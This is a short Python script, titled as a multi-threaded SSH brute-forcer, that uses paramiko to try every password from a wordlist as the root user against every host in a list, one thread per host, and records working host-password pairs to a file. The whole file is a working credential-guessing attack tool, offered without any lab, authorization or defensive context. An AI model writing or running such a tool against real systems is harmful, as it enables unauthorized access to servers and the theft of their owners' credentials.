# multi threaded ssh bruteforce

import paramiko
import threading
import sys

# set the default values
def brute(host):
    for password in open('passwords.txt'):
        password = password.strip()
        print('[-] Trying: ' + password + ' on ' + host)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, username='root', password=password)
        except paramiko.AuthenticationException:
            print(f'[!] Password Incorrect: {host} ' + password)
        else:
            print(f'[+] Password Found: {host} ' + password)
            open('found.txt', 'a').write(host + ' ' + password + ' root'+'\n')
            ssh.close()
            break

for host in open('hosts.txt'):
    host = host.strip()
    t = threading.Thread(target=brute, args=(host,))
    t.start()

